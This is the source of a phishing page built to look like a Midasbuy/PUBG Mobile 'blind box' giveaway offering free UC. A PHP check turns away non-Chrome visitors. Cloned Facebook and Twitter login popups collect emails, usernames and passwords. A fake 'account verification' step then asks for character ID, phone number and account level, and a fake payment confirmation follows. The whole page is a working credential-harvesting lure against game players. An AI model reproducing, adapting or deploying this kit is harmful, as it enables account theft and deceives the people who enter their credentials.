<?php
if ($_SERVER["HTTP_ACCEPT"] and preg_match("/(.*?)Chrome(.*?)/",$_SERVER["HTTP_USER_AGENT"])){
} else {
echo"ماشي 🤣🤣🤣"; 
return false; 
}
?>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="https://www.midasbuy.com/favicon.ico">
<title>Midasbuy</title>
<meta property="og:site_name" content="Midasbuy">
<meta property="og:type" content="article">
<meta property="og:image" content="">
<meta property="og:title" content="">
<meta property="og:description" content="">
<meta property="og:site_name" content="Midasbuy">
<meta property="og:image" content="https://cdn.midasbuy.com/events/blindBox/images/blindBox_share_fb.png">
<meta property="og:type" content="article">
<meta property="og:title" content="1$ TO WIN 88 UC!">
<meta property="og:description" content="Share to get free gifts">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="css/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
</head>
<style>
    @keyframes rotate {
        from {
            transform: rotate(0)
        }

        to {
            transform: rotate(360deg);
        }
    }

    /* stylelint-disable-next-line selector-max-id */
    #loader-spin {
        animation: 0.5s linear infinite rotate;
        transform-origin: 20px 20px;
    }
	
	@font-face {
            font-family: dinm;
            src: url(font/DINMITTELSCHRIFTSTD.eot);
            src: url(font/DINMITTELSCHRIFTSTD.eot?#iefix) format('embedded-opentype'), url(font/DINMITTELSCHRIFTSTD.woff) format('woff'), url(font/DINMITTELSCHRIFTSTD.ttf) format('truetype'), url(font/DINMITTELSCHRIFTSTD.svg#webfont34M5alKg) format('svg');
</style>
<body>
<div class="" style="background: #181f29;">
<div data-module="base_button_qiehuanyuyan">
<div>
<div class="index-module-c3925">
<div class="index-module-b8461">
<img data-prop="bgImage" src="img/pubgm-logo.png" alt="" class="index-module-e4539">
<img data-prop="bgImage" src="img/midasbuy-logo.png" alt="" class="index-module-f46d0">
</div>
<div class="index-module-b260f">
<div class="index-module-ad0b3">
<img data-prop="bgImage" src="img/bottom.png" alt="">
</div>
<div class="index-module-ffca2">
<div>English</div>
<img data-prop="bgImage" src="img/lang-icon.png" alt="" class="index-module-f1c67">
</div>
</div>
</div>
</div>
</div>
<div class="slideHeaderDesktopWrapper">
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/906-1920x240-EN.71b79b20.jpg') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.82c12f43.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.a97df733.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.bb322431.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.bb322431.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.0271ce31.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.7dbdd97f.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920-240.321b317e.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.ed4ed184.png') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.5f1ba3cc.jpg') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.c14b9297.jpg') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.7c808b6c.jpg') no-repeat center; background-size: cover;"></div>
</div>
<div class="slideHeaderDesktop">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.dbf12c4a.jpg') no-repeat center; background-size: cover;"></div>
</div>
</div>
<div class="slideHeaderMobileWrapper">
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/906-1920x240-EN.71b79b20.jpg') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.82c12f43.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.a97df733.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.bb322431.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.bb322431.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.0271ce31.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.7dbdd97f.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920-240.321b317e.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.ed4ed184.png') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920_240.5f1ba3cc.jpg') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.c14b9297.jpg') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.7c808b6c.jpg') center center / cover no-repeat"></div>
</div>
<div class="slideHeaderMobile">
<div class="header" style="background: url('https://cdn.midasbuy.com/images/1920x240.dbf12c4a.jpg') center center / cover no-repeat"></div>
</div>
</div>
<br>
<div data-module="base_daqudenglu_budaitouxiangdaqudenglu_6">
<div class="index-module-e59e5">
<div class="index-module-b5786">
<div class="index-module-bfde9">
<div class="index-module-fd9bb">Login to Midasbuy and participate in activities<span class="index-module-c7c86" onclick="open_account_login()">login</span></div>
<div class="index-module-db3d6">
<div class="index-module-b01d7" onclick="open_rules()">Rules</div>
</div>
</div>
</div>
</div>
</div>
<div data-module="play_choujiang_jiangpinlunbo" drawnum="0">
<div class="index-module-e037b" style="height: auto;">
<div class="index-module-e4b17"><img src="img/jackpot_bg.png" alt="" class="index-module-c7b92">
<div class="index-module-a9384">Blind Box Prize Pool (must win one)<img src="img/multiplyingpower.png" alt="true" class="index-module-b50e8"></div>
<div class="swiper index-module-b7de5" style="height: auto;">
<div class="swiper-container index-module-f3bb1 swiper-container-horizontal" style="height: auto;">
<div class="swiper-wrapper index-module-a74ca" style="height: auto;">
<div class="swiper-slide index-module-af172 swiper-slide-active" style="margin-right: 9px;">
<img src="img/prize.png" alt="true" class="index-module-bbd64">
<img src="img/rewards/1.png" alt="true" class="index-module-cbcf5">
<div class="index-module-ee61f"></div>
</div>
<div class="swiper-slide index-module-af172 swiper-slide-next" style="margin-right: 9px;">
<img src="img/prize.png" alt="true" class="index-module-bbd64">
<img src="img/rewards/2.png" alt="true" class="index-module-cbcf5">
<div class="index-module-ee61f"></div>
</div>
<div class="swiper-slide index-module-af172" style="margin-right: 9px;">
<img src="img/prize.png" alt="true" class="index-module-bbd64">
<img src="img/rewards/3.png" alt="true" class="index-module-cbcf5">
<div class="index-module-ee61f"></div>
</div>
<div class="swiper-slide index-module-af172" style="margin-right: 9px;">
<img src="img/prize.png" alt="true" class="index-module-bbd64">
<img src="img/rewards/4.png" alt="true" class="index-module-cbcf5">
<div class="index-module-ee61f"></div>
</div>
</div>
</div>
</div>
<div class="index-module-aeb2a">Daily lottery draws: <span class="index-module-b0568">2 / 2</span></div>
<div class="index-module-c6b58">
<div>
<div class="index-module-c7ad2" onclick="open_account_login()"><img src="img/btn.png" alt="true" class="index-module-c5238" style="">
<div class="index-module-b84d1"><img style="width: 25px; margin-top: -2px; padding-right: 5px; float: left;" src="https://i.postimg.cc/28sztvcd/season-Token.png"> 50 to open</div>
</div>
<div class="index-module-a630f">Get 1000 UC now<img src="img/prize_pic.png" alt="" class="index-module-d0010"></div>
</div>
</div>
</div>
</div>
</div>
<div data-module="play_choujiang_wodejiangpinanniu">
<div class="index-module-bc64f">
<div class="index-module-ccff2">
<div class="index-module-d0eda"><img src="img/reward_and_share.png" alt="" class="index-module-cca20">
<div class="index-module-dd0bb">My reward</div>
</div>
<div class="index-module-d0eda"><img src="img/reward_and_share.png" alt="" class="index-module-cca20">
<div class="index-module-dd0bb">Share activity</div>
</div>
</div>
</div>
</div>
<div data-module="play_renwu_renwuyipaiyi">
<div class="index-module-d703a">
<div class="index-module-e3d8f"><img src="img/jackpot_bg.png" alt="" class="index-module-af843">
<div class="index-module-eb71c">Accumulated opening rewards</div>
<div class="index-module-d8d68">
<div class="index-module-cde9b">
<div class="index-module-dacd5">
<div class="index-module-c44e8"><img src="img/prize.png" alt="" class="index-module-f9cd9">
<img src="img/rewards/5.png" alt="" class="index-module-be588">
<div class="index-module-fd87f"></div>
</div>
<div class="index-module-fab79">RP S5 Hair<br><span class="index-module-aaed4">*Available to receive</span></div>
</div>
<div class="index-module-de010" onclick="open_account_login()">
<div class="index-module-f5f26"><img src="img/task_btn-3.png" alt="" class="index-module-f9cd9">
<div class="index-module-a3ee8">Receive</div>
</div>
</div>
</div>
<div class="index-module-cde9b">
<div class="index-module-dacd5">
<div class="index-module-c44e8"><img src="img/prize.png" alt="" class="index-module-f9cd9">
<img src="img/rewards/6.png" alt="" class="index-module-be588">
<div class="index-module-fd87f"></div>
</div>
<div class="index-module-fab79">Pilot Set<br><span class="index-module-aaed4">*Available to receive</span></div>
</div>
<div class="index-module-de010" onclick="open_account_login()">
<div class="index-module-f5f26"><img src="img/task_btn-3.png" alt="" class="index-module-f9cd9">
<div class="index-module-a3ee8">Receive</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div data-module="base_button_dingyuemidasbuy">
<div class="index-module-f8c0d"></div>
</div>
<div data-module="business_tanchuang_huodongguize" class="mask-module-b6c34 rulesBox" showrulespopup="true" style="display: none;">
<div class="index-module-a28b2"><img data-prop="bgImage" src="img/pup_bg_bottom.png" alt="" class="index-module-b40e3">
<img data-prop="bgImage" src="img/del.png" alt="true" class="index-module-a0bab" onclick="close_popup()">
<div class="index-module-ae5ea">
<div class="index-module-cedce">
<div class="index-module-feae2">Rules</div>
</div>
<div class="index-module-c2b06">
<div class="index-module-f8455">1. Event time: 2023.01.01 00:00 - 2023.02.28 12:59:59</div>
<div class="index-module-f8455">2. During the event, players can open the blind box 2 times a day</div>
<div class="index-module-f8455">3. During the event, open the blind box 4 times and you will get the Clockwork Overlord Parachute (10D),</div>
<div class="index-module-f8455">Open the blind box 7 times in total to get the Hell Mask (permanent)</div>
<div class="index-module-f8455">4. The winning probability of each item is 25%</div>
<div class="index-module-f8455">5. After winning the item, please collect it in the game mailbox. If you win the UC, the player needs to log in to the game again to receive it.</div>
<div class="index-module-f8455">6. Midasbuy is the official top-up mall for PUBGM</div>
</div>
</div>
</div>
</div>
<div class="popup accountLoginBox" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-title">Account Log in</div> 
<div class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Login with Facebook account</div>
<div class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Login with Twitter account</div>
<br>
</div> 
</div> 
<div class="popup-login login-facebook" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> 
<div class="content-box-fb">
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> 
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> 
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> 
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> 
<div class="txt-not-now">Not now</div> 
<div class="txt-forgotten-password">Forgotten password?</div> 
</div> 
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> 
<div class="language-name">Bahasa Indonesia</div> 
<div class="language-name">Basa Jawa</div> 
<div class="language-name">Bahasa Melayu</div> 
<div class="language-name">日本語</div> 
<div class="language-name">Español</div> 
<div class="language-name">Português (Brasil)</div> 
<div class="language-name"><i class="fa fa-plus"></i></div> 
</center>
</div> 
<div class="copyright">Facebook Inc.</div> 
</div> 
</div> 
<div class="popup-login login-twitter" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png">
</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Twitter</div> 
<div class="input-box-twitter">
<label>username</label>
<input type="text" name="user" id="email-user" placeholder="" required>
</div> 
<div class="input-box-twitter">
<label>Phone or email </label>
<input type="text" name="email" id="email-twitter" placeholder="" required>
</div> 
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> 
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> 
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required>
</div> 
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> 
<div class="footer-menu-twitter bulet">•</div> 
<div class="footer-menu-twitter">Sign up to Twitter</div> 
</form>
</center>
</div> 
</div> 
</div> 
</div> 
<div class="popup account_verification" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-title">Account Verification</div> 
<form class="popup-box-wrapper-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="user" id="validateuser" readonly>
<input type="text" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select style="margin-bottom: 20px;" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
 <option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</form> 
</div> 
</div> 
<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-title">Account Verification</div> 
<div class="popup-box-alert-checking">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> 
</div> 
</div> 
<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-title">Payment Completed</div> 
<div class="popup-box-alert-processing">
Payment for item purchases has been made successfully.
<br>
<br>
Please wait up to 24 hours, the reward will be sent to your account via in-game mail box.
</div> 
<button type="button" onclick="location.href='https://Sherif.store/free/';">Logout</button>
</div> 
</div> 
</div>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>
<script src="js/showHide.js"></script>
<script>(function(){var js = "window['__CF$cv$params']={r:'787de64cfacfdbdd',m:'3yC4i_W2JSfPxhdm2j2qFoYwV1zYLbGeu7ZICjcVE24-1673442700-0-Afqpt4WYxC3QYJuxbCgANlckkjYIfdwW67JIArIadlKCcI0K1yL33uvY6rCW4SJiQ+CSyuoDtz86VjiftKNlXuISKr3in8uFX8D13lGxOR6klo+rfhfo7+gVyuQg7XaxUw==',s:[0xdc81698823,0x49f48caf2b],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
</html>